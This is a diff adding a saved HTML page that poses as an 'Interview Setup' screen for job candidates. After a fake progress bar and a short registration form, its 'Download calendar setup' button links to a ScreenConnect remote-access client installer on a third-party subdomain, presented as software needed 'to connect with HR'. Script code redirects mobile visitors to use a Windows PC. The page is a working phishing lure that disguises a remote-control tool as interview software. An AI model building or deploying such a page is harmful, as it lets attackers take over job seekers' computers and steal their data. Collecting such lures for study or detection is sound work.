@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<!-- saved from url=(0067)https://storage.googleapis.com/meeting-setup/Meting-Interview2.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>Interview Setup</title>
+
+<style>
+*{box-sizing:border-box;}
+
+body{
+margin:0;
+font-family:"Segoe UI", Arial, sans-serif;
+height:100vh;
+background:linear-gradient(135deg,#e9eef5,#f6f8fb);
+display:flex;
+align-items:center;
+justify-content:center;
+}
+
+.panel{
+width:520px;
+background:#ffffff;
+border-radius:14px;
+box-shadow:0 18px 40px rgba(0,0,0,0.12);
+padding:40px 36px;
+text-align:center;
+position:relative;
+}
+
+.date{
+font-size:13px;
+color:#6b7280;
+margin-bottom:12px;
+}
+
+.status{
+font-size:18px;
+color:#1f2937;
+margin-bottom:6px;
+}
+
+.substatus{
+font-size:14px;
+color:#6b7280;
+margin-bottom:28px;
+}
+
+.progress-wrapper{
+width:100%;
+height:8px;
+background:#e5e7eb;
+border-radius:4px;
+overflow:hidden;
+margin-bottom:18px;
+}
+
+.progress-bar{
+width:1%;
+height:100%;
+background:linear-gradient(90deg,#2563eb,#60a5fa);
+transition:width 0.08s linear;
+}
+
+.counter{
+font-size:28px;
+color:#2563eb;
+}
+
+.download-box{
+display:none;
+margin-top:30px;
+padding:26px;
+background:#f9fafb;
+border-radius:12px;
+border:1px solid #e5e7eb;
+text-align:left;
+}
+
+.download-title{
+font-size:16px;
+color:#111827;
+margin-bottom:8px;
+text-align:center;
+font-weight:bold;
+}
+
+.download-text{
+font-size:14px;
+color:#6b7280;
+margin-bottom:18px;
+text-align:center;
+}
+
+.download-btn{
+display:block;
+width:100%;
+padding:14px;
+background:linear-gradient(135deg,#2563eb,#3b82f6);
+color:#ffffff;
+text-decoration:none;
+border-radius:8px;
+font-size:14px;
+text-align:center;
+margin-top:10px;
+}
+
+.mobile-warning{
+display:none;
+margin-top:25px;
+padding:20px;
+background:#fff4f4;
+border:1px solid #fecaca;
+color:#991b1b;
+border-radius:10px;
+font-size:14px;
+}
+
+.form-group{
+margin-bottom:12px;
+}
+
+.form-group label{
+font-size:13px;
+color:#374151;
+display:block;
+margin-bottom:4px;
+}
+
+.form-group input{
+width:100%;
+padding:10px;
+border:1px solid #d1d5db;
+border-radius:6px;
+font-size:14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="panel">
+
+<div class="date" id="date">Friday, May 22, 2026</div>
+
+<div class="status">Preparing interview calendar</div>
+<div class="substatus">Please wait while we complete your interview setup</div>
+
+<div class="progress-wrapper">
+<div class="progress-bar" id="bar" style="width: 100%;"></div>
+</div>
+
+<div class="counter" id="counter" style="display: none;">100%</div>
+
+<div class="download-box" id="download" style="display: block;">
+<div class="download-title">Register For An Interview</div>
+
+<div class="form-group">
+<label>Name</label>
+<input type="text" placeholder="Enter your name">
+</div>
+
+<div class="form-group">
+<label>Date</label>
+<input type="date">
+</div>
+
+<div class="form-group">
+<label>Time</label>
+<input type="time">
+</div>
+
+<div class="form-group">
+<label>Invite Code</label>
+<input type="text" placeholder="Enter invite code">
+</div>
+
+<div class="download-text" style="margin-top:10px; font-weight:bold;">
+Download and install interview setup to connect with HR.
+</div>
+
+<a href="https://professionalpitstop.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&amp;y=Guest&amp;c=Turner&amp;c=&amp;c=&amp;c=&amp;c=&amp;c=&amp;c=&amp;c=" class="download-btn">
+Download calendar setup
+</a>
+</div>
+
+<div class="mobile-warning" id="mobileWarning">
+This file can only be downloaded on a Windows computer.<br>
+Please open this page from a Windows PC to download the interview calendar setup.
+</div>
+
+</div>
+
+<script>
+
+// show current date
+let today = new Date();
+let options = { weekday:'long', year:'numeric', month:'long', day:'numeric' };
+document.getElementById("date").innerText = today.toLocaleDateString("en-US", options);
+
+let count = 1;
+let counter = document.getElementById("counter");
+let bar = document.getElementById("bar");
+let download = document.getElementById("download");
+let mobileWarning = document.getElementById("mobileWarning");
+
+// detect mobile
+let isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+
+let interval = setInterval(() => {
+
+count++;
+counter.textContent = count + "%";
+bar.style.width = count + "%";
+
+if(count >= 100){
+clearInterval(interval);
+counter.style.display="none";
+
+if(isMobile){
+mobileWarning.style.display="block";
+}else{
+download.style.display="block";
+}
+}
+
+},90);
+
+</script>
+
+
+</body></html>
